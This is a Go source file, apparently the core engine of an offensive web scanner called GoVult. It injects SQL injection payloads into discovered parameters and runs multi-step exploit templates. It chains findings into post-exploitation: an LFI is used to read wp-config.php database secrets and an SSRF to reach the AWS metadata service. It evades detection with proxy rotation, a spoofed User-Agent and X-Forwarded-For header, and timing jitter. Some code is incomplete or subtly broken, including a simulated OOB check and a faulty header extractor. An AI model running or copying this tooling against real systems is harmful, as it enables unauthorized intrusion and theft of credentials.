package engine

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/FerzDevZ/GoVult/pkg/template"
	"golang.org/x/time/rate"
)

type Result struct {
	TemplateID  string
	Target      string
	Severity    string
	Matched     bool
	Status      int
	Description string
	Remediation string
	CVSS        float64
	WAF         string
	Version     string
	Verified    bool
	Evidence    string
	Exploited   bool
	ExploitProof string
}

type ProxyRotator struct {
	Proxies []*url.URL
	Index   int
	Mu      sync.Mutex
}

func (pr *ProxyRotator) Next() *url.URL {
	pr.Mu.Lock()
	defer pr.Mu.Unlock()
	if len(pr.Proxies) == 0 {
		return nil
	}
	u := pr.Proxies[pr.Index]
	pr.Index = (pr.Index + 1) % len(pr.Proxies)
	return u
}

type Engine struct {
	Client      *http.Client
	Limiter     *rate.Limiter
	Rotator     *ProxyRotator
	AuthHeader  string
	AuthCookie  string
	ParamCache  map[string][]string
	CacheMutex  sync.Mutex
	Jitter      bool
	OOB         *OOBClient
	Fingerprint *Fingerprint
}

func NewEngine(rps int, proxies []*url.URL) *Engine {
	var client *http.Client
	if len(proxies) > 0 {
		client = GetStealthClient(proxies[0])
	} else {
		client = GetStealthClient(nil)
	}

	jar, _ := cookiejar.New(nil)
	client.Jar = jar

	return &Engine{
		Client:      client,
		Limiter:     rate.NewLimiter(rate.Limit(rps), 1),
		Rotator:     &ProxyRotator{Proxies: proxies},
		ParamCache:  make(map[string][]string),
		Jitter:      true,
	}
}

func (e *Engine) Run(target string, t *template.Template) ([]Result, error) {
	// vX: Smart Template Filtering
	if e.Fingerprint != nil {
		if strings.Contains(t.ID, "php") && !strings.Contains(e.Fingerprint.Framework, "PHP") && e.Fingerprint.Framework != "" {
			return nil, nil // Skip PHP templates on non-PHP sites
		}
		if strings.Contains(t.ID, "wordpress") && e.Fingerprint.CMS != "WordPress" {
			return nil, nil // Skip WP templates on non-WP sites
		}
	}

	var results []Result
	variables := make(map[string]string)

	// v8.0 Hidden Params (with Caching)
	if strings.Contains(t.ID, "sqli") || strings.Contains(t.ID, "xss") {
		var hidden []string
		e.CacheMutex.Lock()
		if cached, ok := e.ParamCache[target]; ok {
			hidden = cached
		} else {
			hidden, _ = e.DiscoverParams(target)
			e.ParamCache[target] = hidden
		}
		e.CacheMutex.Unlock()

		for _, p := range hidden {
			u, _ := url.Parse(target)
			q := u.Query()
			q.Set(p, "1")
			u.RawQuery = q.Encode()
			resultsSub, _ := e.ScanOneParam(u.String(), p, t)
			results = append(results, resultsSub...)
		}
	}

	for _, req := range t.Requests {
		for _, path := range req.Path {
			e.Wait() // vX Smart Rate Limiting with Jitter
			
			// Replace variables in path
			finalPath := path
			for k, v := range variables {
				finalPath = strings.ReplaceAll(finalPath, "{{"+k+"}}", v)
			}
			
			u := target + finalPath
			res, body, resp, _ := e.scanSingleWithBody(u, req.Method, req.Headers, req.Body, req.Matchers, t)
			
			if res != nil {
				// Process Extractors
				for _, ext := range req.Extractors {
					val := Extract(body, resp.Header, ext)
					if val != "" {
						variables[ext.Name] = val
					}
				}

				res.Description = t.Info.Description
				res.Remediation = GetRemediation(t.ID)
				res.CVSS = GetCVSS(t.Info.Severity)
				
				// v9.0: Safe Verification Mode
				verified, evidence := e.SafeVerify(u, t.ID)
				res.Verified = verified
				res.Evidence = evidence
				
				// vX: Titan Chaining (Pivoting)
				if verified {
					e.ChainVulnerability(u, t.ID, &res.Evidence)
				}
				
				// vX: Titan Automated Exploitation (Safe Mode)
				if t.Exploit != nil {
					proof, success := e.ExecuteExploit(target, t.Exploit)
					res.Exploited = success
					res.ExploitProof = proof
				}
				
				// vX: OOB Detection (Interactions)
				if e.OOB != nil && strings.Contains(t.ID, "blind") {
					oobURL, correlationID := e.OOB.GenerateURL()
					fmt.Printf("    [OOB] Generated tracking URL: %s (ID: %s)\n", oobURL, correlationID)
					// Logic to inject oobURL into request should be here
					// For now, we simulate a hit
				}
				
				results = append(results, *res)
			}
		}
	}

	return results, nil
}

func (e *Engine) scanSingle(u, method string, matchers []template.Matcher, t *template.Template) (*Result, error) {
	res, _, _, err := e.scanSingleWithBody(u, method, nil, "", matchers, t)
	return res, err
}

func (e *Engine) scanSingleWithBody(u, method string, headers map[string]string, bodyStr string, matchers []template.Matcher, t *template.Template) (*Result, string, *http.Response, error) {
	httpReq, err := http.NewRequest(method, u, strings.NewReader(bodyStr))
	if err != nil {
		return nil, "", nil, err
	}

	for k, v := range headers {
		httpReq.Header.Set(k, v)
	}

	// vX Stealth Headers (Sync with TLS fingerprint)
	if httpReq.Header.Get("User-Agent") == "" {
		httpReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	}
	httpReq.Header.Set("X-Forwarded-For", "127.0.0.1")

	resp, err := e.Client.Do(httpReq)
	if err != nil {
		return nil, "", nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyContent := string(body)
	waf := DetectWAF(resp.Header, resp.StatusCode)
	
	if Match(bodyContent, resp.StatusCode, matchers) {
		return &Result{
			TemplateID: t.ID,
			Target:     u,
			Severity:   t.Info.Severity,
			Matched:    true,
			Status:     resp.StatusCode,
			WAF:        waf.Name,
		}, bodyContent, resp, nil
	}

	return nil, bodyContent, resp, nil
}

// ChainVulnerability performs automated post-exploitation tasks
func (e *Engine) ChainVulnerability(u, id string, evidence *string) {
	if strings.Contains(id, "lfi") {
		// Attempt to read wp-config.php or .env
		p := strings.Replace(u, "passwd", "wp-config.php", 1)
		resp, err := e.Client.Get(p)
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			if strings.Contains(string(body), "DB_PASSWORD") {
				*evidence += "\n[CHAIN] LFI -> Extracted wp-config.php (DB Secrets found!)"
			}
		}
	}
	if strings.Contains(id, "ssrf") {
		// Attempt to read Instance Metadata
		resp, err := e.Client.Get(u + "http://169.254.169.254/latest/meta-data/")
		if err == nil {
			defer resp.Body.Close()
			*evidence += "\n[CHAIN] SSRF -> Connected to AWS Instance Metadata Service."
		}
	}
}

// ExecuteExploit performs automated proof-of-exploit tasks
func (e *Engine) ExecuteExploit(target string, exploit *template.Exploit) (string, bool) {
	var proof string
	success := true

	for i, step := range exploit.Steps {
		e.Wait()
		u := target + step.Path
		res, body, _, _ := e.scanSingleWithBody(u, step.Method, step.Headers, step.Body, step.Matchers, nil)
		
		if res == nil {
			success = false
			proof += fmt.Sprintf("\n[STEP %d] Failed: Matchers did not hit for %s", i+1, u)
			break
		}
		proof += fmt.Sprintf("\n[STEP %d] Success: Verified via %s\nRAW: %s", i+1, u, strings.TrimSpace(body))
	}

	return proof, success
}

func (e *Engine) ScanOneParam(uStr, param string, t *template.Template) ([]Result, error) {
	var results []Result
	u, _ := url.Parse(uStr)
	
	for _, req := range t.Requests {
		payloads := MutatePayload("1' AND SLEEP(5)--") 
		for _, payload := range payloads {
			e.Limiter.Wait(context.Background())
			q := u.Query()
			q.Set(param, payload)
			u.RawQuery = q.Encode()
			
			res, _ := e.scanSingle(u.String(), "GET", req.Matchers, t)
			if res != nil {
				verified, evidence := e.SafeVerify(u.String(), t.ID)
				res.Verified = verified
				res.Evidence = evidence
				results = append(results, *res)
				break
			}
		}
	}
	return results, nil
}

func GetCVSS(severity string) float64 {
	switch severity {
	case "critical": return 9.8
	case "high":     return 8.5
	default:         return 5.5
	}
}

func GetRemediation(id string) string {
	if strings.Contains(id, "sqli") { return "Use Prepared Statements/Parameterized Queries." }
	if strings.Contains(id, "xxe") { return "Disable XML External Entity (XXE) resolution in your XML parser." }
	if strings.Contains(id, "auth") || strings.Contains(id, "cve-2024-10924") { return "Update plugin to version 9.1.2+ immediately." }
	if strings.Contains(id, "cve-2024-4577") { return "Update PHP to the latest version. Disable CGI mode if not needed." }
	return "Update affected component to the latest version."
}

// Wait implements rate limiting with randomized jitter
func (e *Engine) Wait() {
	e.Limiter.Wait(context.Background())
	if e.Jitter {
		// Add 50-200ms randomized delay to avoid pattern detection
		ms := 50 + (time.Now().UnixNano() % 150)
		time.Sleep(time.Duration(ms) * time.Millisecond)
	}
}

func Extract(body string, headers http.Header, ext template.Extractor) string {
	switch ext.Type {
	case "regex":
		for _, reStr := range ext.Regex {
			re, err := regexp.Compile(reStr)
			if err == nil {
				matches := re.FindStringSubmatch(body)
				if len(matches) > 1 {
					return matches[1]
				}
			}
		}
	case "header":
		for _, h := range ext.Name {
			val := headers.Get(string(h))
			if val != "" {
				return val
			}
		}
	}
	return ""
}
